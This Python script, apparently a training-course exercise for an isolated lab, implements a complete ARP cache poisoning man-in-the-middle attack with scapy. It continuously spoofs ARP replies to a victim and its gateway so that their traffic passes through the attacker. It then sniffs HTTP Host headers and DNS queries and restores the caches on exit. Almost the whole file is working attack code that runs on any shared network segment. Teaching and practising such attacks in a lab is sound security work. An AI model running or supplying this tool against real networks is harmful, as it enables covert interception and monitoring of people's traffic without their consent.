#!/usr/bin/env python3
"""
Module 3 — Exercise 3-A: ARP Cache Poisoning MitM

Poisons victim's ARP cache to impersonate the gateway,
and poisons gateway's ARP cache to impersonate the victim.
While traffic flows through the attacker, sniffs HTTP Host headers and DNS queries.
Restores caches on exit (Ctrl-C).

REQUIRES:
  - Root privileges
  - IP forwarding enabled: echo 1 > /proc/sys/net/ipv4/ip_forward
  - Both victim and gateway on the same L2 segment as attacker

Usage:
  sudo python3 module3/arp_mitm.py --victim 192.168.56.2 --gateway 192.168.56.254 --iface eth0
"""

import argparse
import signal
import sys
import threading
import time

from scapy.all import (
    Ether, IP, TCP, UDP, ARP, DNS, DNSQR, Raw,
    sendp, srp1, sniff, AsyncSniffer,
    conf, get_if_hwaddr,
)

conf.verb = 0
conf.iface = conf.route.route("192.168.56.0")[0]  # default to isolated lab NIC (not Vagrant NAT)
stop_event = threading.Event()


# ── ARP utilities ─────────────────────────────────────────────────────────────

def get_mac(ip: str, iface: str, timeout: float = 3.0) -> str:
    """Resolve IP to MAC via ARP request. Raises RuntimeError if unreachable."""
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    reply = srp1(pkt, iface=iface, timeout=timeout, verbose=False)
    if reply is None:
        raise RuntimeError(f"Could not resolve MAC for {ip} — host unreachable or not on segment")
    return reply[ARP].hwsrc


def poison(target_ip: str, target_mac: str, spoof_ip: str, iface: str):
    """
    Send a gratuitous ARP reply to target_ip telling it that
    spoof_ip is at the attacker's MAC address.
    """
    pkt = Ether(dst=target_mac) / ARP(
        op=2,               # ARP reply (is-at)
        pdst=target_ip,     # send to target
        hwdst=target_mac,   # target's MAC
        psrc=spoof_ip,      # lie: spoof_ip is at our MAC
        # hwsrc defaults to attacker's real MAC
    )
    sendp(pkt, iface=iface, verbose=False)


def restore(target_ip: str, target_mac: str, real_ip: str, real_mac: str, iface: str):
    """Send a legitimate ARP reply to restore the target's cache entry."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_ip,
        hwsrc=real_mac,
    )
    # Send multiple times to ensure it takes
    sendp(pkt, iface=iface, count=5, inter=0.1, verbose=False)


# ── Poison threads ────────────────────────────────────────────────────────────

def poison_loop(
    victim_ip: str, victim_mac: str,
    gateway_ip: str, gateway_mac: str,
    iface: str,
    interval: float = 2.0,
):
    """
    Continuously poison both victim and gateway at `interval` seconds.
    Stops when stop_event is set.
    """
    print(f"[*] Starting ARP poison loop (interval={interval}s)")
    while not stop_event.is_set():
        # Tell victim: gateway is at attacker's MAC
        poison(victim_ip, victim_mac, gateway_ip, iface)
        # Tell gateway: victim is at attacker's MAC
        poison(gateway_ip, gateway_mac, victim_ip, iface)
        stop_event.wait(interval)
    print("[*] Poison loop stopped")


# ── Traffic interception callbacks ─────────────────────────────────────────────

def intercept_callback(pkt):
    """Called for each sniffed packet while MitM is active."""
    # Print HTTP Host headers
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        raw = pkt[Raw].load
        if raw.startswith(b"GET ") or raw.startswith(b"POST ") or raw.startswith(b"HTTP"):
            for line in raw.split(b"\r\n"):
                if line.lower().startswith(b"host:"):
                    print(f"  [HTTP] {pkt[IP].src} → {pkt[IP].dst}  {line.decode(errors='replace')}")

    # Print DNS queries
    if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode(errors="replace").rstrip(".")
        src_ip = pkt[IP].src if pkt.haslayer(IP) else "?"
        print(f"  [DNS]  {src_ip} query: {qname}")


# ── Cleanup and restore ────────────────────────────────────────────────────────

def cleanup(
    victim_ip, victim_mac,
    gateway_ip, gateway_mac,
    iface,
):
    print("\n[!] Restoring ARP caches...")
    restore(victim_ip,  victim_mac,  gateway_ip, gateway_mac, iface)
    restore(gateway_ip, gateway_mac, victim_ip,  victim_mac,  iface)
    print("[+] ARP caches restored. Exiting.")


# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="ARP MitM with traffic interception")
    parser.add_argument("--victim",  required=True, help="Victim IP (e.g. 192.168.56.2)")
    parser.add_argument("--gateway", required=True, help="Gateway IP (e.g. 192.168.56.254)")
    parser.add_argument("--iface",   default=conf.iface, help="Network interface")
    parser.add_argument("--interval", type=float, default=2.0, help="Poison interval in seconds")
    args = parser.parse_args()

    print(f"[*] ARP MitM Attack")
    print(f"    Victim:  {args.victim}")
    print(f"    Gateway: {args.gateway}")
    print(f"    Interface: {args.iface}")

    # Verify IP forwarding
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            if f.read().strip() != "1":
                print("[!] WARNING: IP forwarding is OFF. Traffic will NOT be relayed.")
                print("    Fix: echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
    except FileNotFoundError:
        print("[!] Cannot check IP forwarding (not Linux?)")

    # Resolve MACs
    print("[*] Resolving MAC addresses...")
    try:
        victim_mac  = get_mac(args.victim,  args.iface)
        gateway_mac = get_mac(args.gateway, args.iface)
    except RuntimeError as e:
        print(f"[-] {e}")
        sys.exit(1)

    print(f"[+] Victim  {args.victim}  is at {victim_mac}")
    print(f"[+] Gateway {args.gateway} is at {gateway_mac}")

    # Register cleanup on SIGINT (Ctrl-C)
    def handle_sigint(sig, frame):
        stop_event.set()

    signal.signal(signal.SIGINT, handle_sigint)

    # Start poisoning thread
    poison_thread = threading.Thread(
        target=poison_loop,
        args=(args.victim, victim_mac, args.gateway, gateway_mac, args.iface, args.interval),
        daemon=True,
    )
    poison_thread.start()

    # Start async sniffer to intercept relayed traffic
    bpf = f"ip host {args.victim}"   # capture traffic to/from victim
    sniffer = AsyncSniffer(
        iface=args.iface,
        filter=bpf,
        prn=intercept_callback,
        store=False,
    )
    sniffer.start()

    print(f"\n[+] MitM active. Intercepting traffic from {args.victim}")
    print("[*] Press Ctrl-C to stop and restore caches\n")

    try:
        stop_event.wait()
    finally:
        sniffer.stop()
        stop_event.set()
        poison_thread.join(timeout=5)
        cleanup(args.victim, victim_mac, args.gateway, gateway_mac, args.iface)


if __name__ == "__main__":
    main()
